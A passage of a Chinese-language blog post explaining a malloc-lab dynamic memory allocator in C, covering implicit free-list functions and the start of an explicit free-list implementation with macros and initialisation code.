coalesce(bp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mm-malloc"><a href="#mm-malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h3><p>mm_malloc也比较简单，首先更改请求size，满足8字节对齐+元数据的开销要求。接着尝试找到当前可用heap中是否有能够满足本次请求的block，有则直接place，无则需要扩展当前可用heap的大小，扩展后再place。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_malloc - Allocate a block by incrementing the brk pointer.</span></span><br><span class="line"><span class="comment"> *     Always allocate a block whose size is a multiple of the alignment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> asize;      <span class="comment">// Adjusted block size</span></span><br><span class="line">    <span class="keyword">size_t</span> extendsize; <span class="comment">// Amount to extend heap if no fit</span></span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Ajust block size to include overhea and alignment reqs;</span></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= DSIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        asize = <span class="number">2</span> * DSIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        asize = DSIZE * ((size + (DSIZE) + (DSIZE - <span class="number">1</span>)) / DSIZE); <span class="comment">// 超过8字节，加上header/footer块开销，向上取整保证是8的倍数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Search the free list for a fit</span></span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        place(bp, asize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// No fit found. Get more memory and place the block</span></span><br><span class="line">        extendsize = MAX(asize, CHUNKSIZE);</span><br><span class="line">        <span class="keyword">if</span> ((bp = extend_heap(extendsize / WSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        place(bp, asize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc\n&quot;</span>);</span><br><span class="line">    print_allocated_info();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="find-fit"><a href="#find-fit" class="headerlink" title="find_fit"></a>find_fit</h3><p>遍历整个list，找到还未分配且满足当前请求大小的block，然后返回该block的首地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 使用first-fit policy</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> * @return void* 成功，返回可用块的首地址</span></span><br><span class="line"><span class="comment"> *               失败，返回NULL</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *bp ;      </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (bp = NEXT_BLKP(free_list_head); GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(GET_ALLOC(HDRP(bp)) == <span class="number">0</span> &amp;&amp; size &lt;= GET_SIZE(HDRP(bp)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="place"><a href="#place" class="headerlink" title="place"></a>place</h3><p>place的工作也很简单：</p><ol><li>最小块大小（2*DSIZE) &lt;= 当前块的大小-当前请求的块大小 ，则对当前block做split</li><li>否则，直接place即可。</li></ol><p>现在继续看看free：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief place block</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> remain_size;</span><br><span class="line">    <span class="keyword">size_t</span> origin_size;</span><br><span class="line"></span><br><span class="line">    origin_size = GET_SIZE(HDRP(bp));</span><br><span class="line">    remain_size = origin_size - size;</span><br><span class="line">    <span class="keyword">if</span>(remain_size &gt;= <span class="number">2</span>*DSIZE)  <span class="comment">// 剩下的块，最少需要一个double word (header/footer占用一个double word, pyaload不为空，再加上对齐要求)</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">1</span>));</span><br><span class="line">        PUT(HDRP(NEXT_BLKP(bp)), PACK(remain_size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)), PACK(remain_size, <span class="number">0</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 不足一个双字，保留内部碎片</span></span><br><span class="line">        PUT(HDRP(bp), PACK(origin_size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(origin_size, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mm-free"><a href="#mm-free" class="headerlink" title="mm_free"></a>mm_free</h3><p>可以看到，free也是相当简单的，将当前block的分配状态从1更新到0即可。然后做<strong>coalesce操作:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Freeing a block does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    coalesce(ptr);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free\n&quot;</span>);</span><br><span class="line">    print_allocated_info();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="coalesce"><a href="#coalesce" class="headerlink" title="coalesce"></a>coalesce</h3><p>free block后要考虑前后是否也有free block, 如果存在free block需要进行合并.下面给出了4种情况:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826205642747.png" alt="image-20200826205642747"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826205653451.png" alt="image-20200826205653451"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826205703127.png" alt="image-20200826205703127"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826205708948.png" alt="image-20200826205708948"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于存在序言块和尾块，避免了一些边界检查。</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> pre_alloc = GET_ALLOC(HDRP(PREV_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pre_alloc &amp;&amp; next_alloc)&#123;    <span class="comment">// case1: 前后都分配</span></span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pre_alloc &amp;&amp; !next_alloc)&#123;  <span class="comment">// case 2： 前分配，后free</span></span><br><span class="line">        <span class="keyword">void</span> *next_block = NEXT_BLKP(bp);</span><br><span class="line">        size += GET_SIZE(HDRP(next_block));</span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(next_block), PACK(size, <span class="number">0</span>));</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 其余两个tag不用清空？ 正常情况确实不用清空。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!pre_alloc &amp;&amp; next_alloc)&#123;  <span class="comment">// case 3: 前free，后分配</span></span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;      <span class="comment">// 前后两个都是free</span></span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp))) +</span><br><span class="line">                GET_SIZE(FTRP(NEXT_BLKP(bp)));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc"></a>mm_realloc</h3><p>realloc函数实现也很简单, 重新分配size大小的块,然后将旧块内容复制到新块内容上. 注意这里也考虑了block变小的情况.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_realloc - Implemented simply in terms of mm_malloc and mm_free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *oldptr = ptr;</span><br><span class="line">    <span class="keyword">void</span> *newptr;</span><br><span class="line">    <span class="keyword">size_t</span> copySize;</span><br><span class="line">    </span><br><span class="line">    newptr = mm_malloc(size);</span><br><span class="line">    <span class="keyword">if</span> (newptr == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    copySize = GET_SIZE(HDRP(oldptr));</span><br><span class="line">    <span class="keyword">if</span> (size &lt; copySize)</span><br><span class="line">      copySize = size;</span><br><span class="line">    <span class="built_in">memcpy</span>(newptr, oldptr, copySize);</span><br><span class="line">    mm_free(oldptr);</span><br><span class="line">    <span class="keyword">return</span> newptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ok, 以上就是implicit list的所有内容, 下面我们开始讲解explicit list的实现.</p><h2 id="4-explicit-list"><a href="#4-explicit-list" class="headerlink" title="4. explicit list"></a>4. explicit list</h2><p>explicit list和implicit list的区别在于前者在 <strong>逻辑空间</strong> 中维护一个free list, 里面只保存free的blocks, 而后者则是在 <strong>虚拟地址空间</strong>中维护整个list,里面即包含了free blocks也包含了allocated blocks. 当然了, explicit list底层也是虚拟地址空间.下面这张图给出了explicit list的上层结构:</p><p><img data-src="https://pic.downk.cc/item/5f465f2f160a154a67918a70.png" alt="image-20200826210834218"></p><p>下面给出implicit和explicit的每一块的具体结构对比:</p><p><img data-src="https://pic.downk.cc/item/5f465f75160a154a6791b829.png" alt="image-20200826211059458"></p><p>可以看到,explicit比较implicit,每一个块只是多了两个字段,用于保存下一个free block的地址(next)和上一个free block的地址(prev).</p><p>想一下,explict的优点: 大大提高搜索free block的效率. 但是实现复杂度比implicit难,因为多一个逻辑空间的操作.</p><p>首先第一个问题,next和prev占用多大空间? 对于32位的os来说,地址空间的编址大小的32位(4字节), 64位的os则位64位(8字节). 为了简单起见,本文中只考虑32位的情况(gcc编译时加上-m32的参数,默认的makefile已经给出).</p><p>好的现在确定了next和prev的大小,再来确定一个最小块的大小,最小块应该包含header+footer+next+prev+payload,其中payload最小为1个字节, 同时最小块应该保证8字节对齐要求,综合以上所述,一个最小块为:<br>$$<br>4+4+4+1+4=17,向上取8字节对齐,则\<br>MIN_BLOCK = 24<br>$$<br>ok,现在再说明代码中做的一些规定:</p><ol><li>find策略,采用first-fit策略</li><li>对于free后的block应该如何重新插入free list, 本文采用LIFO策略</li><li>对齐约定, 8字节对齐</li></ol><p>有了以上的说明, 差不多就可以写代码了,先从定义的宏出发:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* single word (4) or double word (8) alignment */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALIGNMENT 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* rounds up to the nearest multiple of ALIGNMENT */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WSIZE 4             <span class="comment">/* Word and header/footer size (bytes) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DSIZE 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNKSIZE (1 &lt;&lt; 12) <span class="comment">/* Extend heap by this amount (bytes) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(x, y) ((x) &gt; (y) ? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Pack a size and allocated bit into a word */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACK(size, alloc) ((size) | (alloc))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read and write a word at address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET(p) (*(unsigned int *)(p))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT(p, val) (*(unsigned int *)(p) = (unsigned int)(val))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read the size and allocated fields from address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of its header and footer */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HDRP(bp) ((char *)(bp)-3 * WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - 4 * WSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// free block运算：计算当前block的“NEXT&quot;指针域</span></span><br><span class="line"><span class="comment">// bp:当前block的payload首地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_PTR(bp) ((char *)(bp)-2 * WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_PTR(bp) ((char *)(bp)-WSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// free block运算： 计算下一个free block的payload首地址</span></span><br><span class="line"><span class="comment">// bp:当前block的payload首地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_FREE_BLKP(bp) ((char *)(*(unsigned int *)(NEXT_PTR(bp))))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_FREE_BLKP(bp) ((char *)(*(unsigned int *)(PREV_PTR(bp))))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// virtual address计算：计算下一个block的payload首地址</span></span><br><span class="line"><span class="comment">// bp: 当前block的payload首地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_BLKP(bp) ((char *)(bp)-GET_SIZE(HDRP(bp) - WSIZE))</span></span><br></pre></td></tr></table></figure><p>可以看到, 基本上和implicit的宏差不多, 只是多了NEXT_FREE_BLKP这类宏, 由于调整了每个block的具体layout(多了next和prev), 所以一些运算,如HDRP等需要对应调整.</p><p>然后就是各个函数:</p><blockquote><p>NOTE: 再次注意存在逻辑空间和虚拟地址空间两个空间.</p></blockquote><h3 id="mm-init-1"><a href="#mm-init-1" class="headerlink" title="mm_init"></a>mm_init</h3><p>这个函数的主要工作包括:</p><ol><li>分配 一个word+ MIN_BLOCK</li><li>第一个word是做pad用,用于保证后续分配的block能够8字节对齐,和implicit一样.</li><li>后面的MIN_BLOCK用于作为free_list_head, 和impilicit的序言块作用相同</li><li>最后分配一个CHUNK,分配函数的内部会将这个chunk块插入到free list 中.</li></ol><p>整体来说,explicit的mm_init和implicit的mm_init作用相同,但是组织方式发生了一些变化.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 申请一个块，用于存放root指针</span></span><br><span class="line">    <span class="keyword">char</span> *init_block_p;</span><br><span class="line">    <span class="keyword">if</span> ((init_block_p = mem_sbrk(MIN_BLOCK + WSIZE)) == (<span class="keyword">void</span> *)<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    init_block_p = (<span class="keyword">char</span> *)(init_block_p) + WSIZE; <span class="comment">// 跳过首个对齐块</span></span><br><span class="line"></span><br><span class="line">    free_list_head = init_block_p + <span class="number">3</span> * WSIZE;</span><br><span class="line">    PUT(PREV_PTR(free_list_head), <span class="literal">NULL</span>);</span><br><span class="line">    PUT(NEXT_PTR(free_list_head), <span class="literal">NULL</span>); <span class="comment">// 初始化root指针为NULL（0）</span></span><br><span class="line">    PUT(HDRP(free_list_head), PACK(MIN_BLOCK, <span class="number">1</span>));</span><br><span class="line">    PUT(FTRP(free_list_head), PACK(MIN_BLOCK, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Extend the empty heap with a free block of CHUNKSIZE bytes</span></span><br><span class="line">    <span class="keyword">if</span> ((allocate_from_chunk(CHUNKSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="allocate-from-heap"><a href="#allocate-from-heap" class="headerlink" title="allocate_from_heap"></a>allocate_from_heap</h3><p>allocate_from_heap做的工作很简单, 扩展heap大小, 然后将扩展出来的block插入到free_lilst中.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 扩展heap,并分配满足当前需求的块到free_list中</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param size  需求size 字节为单位</span></span><br><span class="line"><span class="comment"> * @return void*  成功：当前能够分配的块的首地址</span></span><br><span class="line"><span class="comment"> *                失败： NULL， 一般只在run out out memory时才会NULL </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">allocate_from_heap</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *cur_bp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">size_t</span> extend_size = MAX(size, CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span> ((cur_bp = extend_heap(extend_size / WSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入到free list中</span></span><br><span class="line">    insert_to_free_list(cur_bp);</span><br><span class="line">    <span class="keyword">return</span> cur_bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="extend-heap-1"><a href="#extend-heap-1" class="headerlink" title="extend_heap"></a>extend_heap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 扩展当前heap</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param words  需要扩展的words, 字为单位</span></span><br><span class="line"><span class="comment"> * @return void* 当前可用块的payload首地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate an even number of words to maintain alignment */</span></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * WSIZE : words * WSIZE;</span><br><span class="line">    <span class="keyword">if</span> ((<span 